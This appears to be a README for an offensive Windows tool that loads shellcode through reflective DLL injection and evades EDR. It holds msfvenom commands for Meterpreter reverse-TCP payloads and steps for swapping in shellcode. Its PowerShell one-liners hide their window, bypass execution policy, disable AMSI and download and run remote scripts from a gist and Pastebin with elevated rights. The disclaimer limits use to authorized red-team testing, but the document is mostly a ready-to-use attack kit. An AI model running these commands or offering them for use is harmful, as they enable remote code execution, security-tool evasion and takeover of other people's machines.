# Stealth Loader — One-File Reflective Injector

Advanced single-file Windows process injection tool with strong EDR evasion techniques.

**For educational and authorized Red Team / Penetration Testing purposes only.**

---

## Features

- Single Python file (`stealth_loader.py`)
- Full Reflective DLL Injection (no file on disk)
- Multi-stage encryption (XOR + ROT)
- TLS Callback + QueueUserAPC
- Automatic safe process targeting
- Embedded compressed payload

---

## How It Works

### Stage 0 — Python Loader (`stealth_loader.py`)
1. Decompresses the embedded `stealth_injector.dll`
2. Finds target process by name (e.g. `explorer.exe`)
3. Performs **Reflective DLL Injection** directly from memory:
   - Allocates RWX memory in target process
   - Writes full DLL bytes
   - Parses PE header to find correct `DllMain` EntryPoint
   - Calls `DllMain` via `NtCreateThreadEx`

### Stage 1 — `stealth_injector.dll` (Reflective)
1. Executes very early via **TLS Callback**
2. Uses **QueueUserAPC** for delayed execution (stealth)
3. Loads `helper.dll` **reflectively** (in-memory, no `LoadLibrary`)
4. Extracts encryption key from `helper.dll`
5. Decrypts the main shellcode (XOR + ROT)
6. Automatically selects a safe target process
7. Injects decrypted shellcode into the chosen process using `NtCreateThreadEx`

### Stage 2 — Shellcode
- Currently spawns `cmd.exe`
- Can be replaced with any position-independent shellcode (Meterpreter, Cobalt Strike, etc.)


---

## How to Replace Shellcode

### Step-by-step Guide

1. **Generate your new shellcode**

   ```bash
   # Пример с msfvenom (x64)
   msfvenom -p windows/x64/exec CMD="cmd.exe" -f raw -o shellcode.bin
   # Или для reverse shell:
   # msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shellcode.bin
   ```

2. **Convert shellcode to Python bytes**

copy shellcode.bin to project folder

   Run it:
   ```bash
   python shellcode_to_bytes.py
   ```

3. **Replace shellcode in `encrypt_shellcode.py`**

   Open `encrypt_shellcode.py` and replace the entire `shellcode = (` ... `)` block with your new shellcode.

4. **Rebuild the project**

   ```bash
   # With default keys
   python full_build.py

   # With custom keys
   python full_build.py 0xA5 6
   ```

5. **Test**

   ```bash
   python stealth_loader.py explorer.exe
   ```

---

### Important Notes on Shellcode

- Must be **x64** (same architecture as target process)
- Must be **position-independent** (no absolute addresses)
- Avoid large shellcode (> 100KB may cause issues)
- Test shellcode separately before embedding
- For Meterpreter / Cobalt Strike — use stageless payloads

---

## Recommended Shellcode Types

| Purpose                    | msfvenom command |
|---------------------------|------------------|
| Spawn cmd.exe             | `windows/x64/exec CMD=cmd.exe` |
| Reverse TCP Meterpreter   | `windows/x64/meterpreter_reverse_tcp` |
| Bind Shell                | `windows/x64/bind_tcp` |
| Process Hollowing         | Custom |

---

## Project Structure

```
.
├── full_build.py              # Main automatic builder
├── stealth_loader.py          # Final one-file loader (generated)
├── encrypt_shellcode.py       # Shellcode encryptor
├── stealth_injector.c         # Main stealth DLL
├── helper.c                   # Encryption key storage
├── bin2c.py                   # DLL → C array
├── build.bat / build.sh
└── README.md
```

---

## Build & Usage

### Linux

```
sudo apt update && sudo apt install mingw-w64 -y
```

### MacOS

```
brew install mingw-w64
```

### Recommended Way (with custom keys)

```bash
# Default keys
python full_build.py

# Custom XOR and ROT
python full_build.py 0xAB 7
python full_build.py 0xFF 3
```

### Alternative (manual)

```bash
# Windows
build.bat

# Linux / macOS
chmod +x build.sh
./build.sh
```

---

## Usage

```bash
# Run as Administrator!
python stealth_loader.py explorer.exe
python stealth_loader.py svchost.exe
python stealth_loader.py notepad.exe
```

---

## Changing Shellcode

1. Replace the shellcode inside `encrypt_shellcode.py`
2. Rebuild using `full_build.py`

---

## Configuration

| Parameter     | Location               | Description                     |
|---------------|------------------------|---------------------------------|
| `XOR_KEY`     | `full_build.py`        | Main encryption key             |
| `ROT_VALUE`   | `full_build.py`        | Rotation value (1-7)            |
| Target        | Command line argument  | Process to inject into          |

---

## PowerShell script usage

### Place files on web server

The PowerShell script `stealth_stager.ps1` can be used to download and execute the stealth loader.

1. Replace URLs in the PowerShell script with your own hosting location of python stealth_loader.py
2. Host the PowerShell script on a web server or use a paste service like Pastebin 
3. Replace ps script url to your hosted url ((http://yourserver/stealth_stager.ps1))
4. Download and execute the PowerShell script:

```powershell
# Download and execute
powershell -NoP -NonI -W Hidden -Exec Bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/santaklouse/b0cd38ef346622db4b563ebf51d803d4/raw/stealth_stager.ps1'); Invoke-StealthLoad -Target explorer.exe"
```

### Use PowerShell oneliner

1. Replace in oneliner url of your python loader script (https://raw.githubusercontent.com/yourusername/repo/main/stealth_loader.py)
2. Execute oneliner

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -C "try{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}catch{};$u='https://pastebin.com/raw/V05ydb7K';$d=(New-Object Net.WebClient).DownloadString($u);$p=\"$env:TEMP\u.ps1\";$d|Out-File $p -Enc UTF8;Start-Process powershell -Arg \"-NoP -NonI -W Hidden -Exec Bypass -File $p explorer.exe\" -Verb RunAs -WindowStyle Hidden"
```

### another oneliner
```powershell
 powershell -nop -c "IWR https://gist.githubusercontent.com/santaklouse/b0cd38ef346622db4b563ebf51d803d4/raw/ -OutFile $env:TEMP\s.py; python $env:TEMP\s.py explorer.exe"
```

---

## Evasion Techniques

- Reflective loading
- TLS + APC execution
- Custom encryption
- `NtCreateThreadEx`
- Minimal `DllMain`

---

## ⚠️ Warnings

- Requires **Administrator rights**
- Can be detected by modern EDRs
- Use only on systems you own or have explicit permission to test
- May crash target processes

---

## Legal Disclaimer

This project is for **educational and authorized security research** only. Unauthorized use against systems without permission is illegal.

---

**Good luck and stay stealthy.**

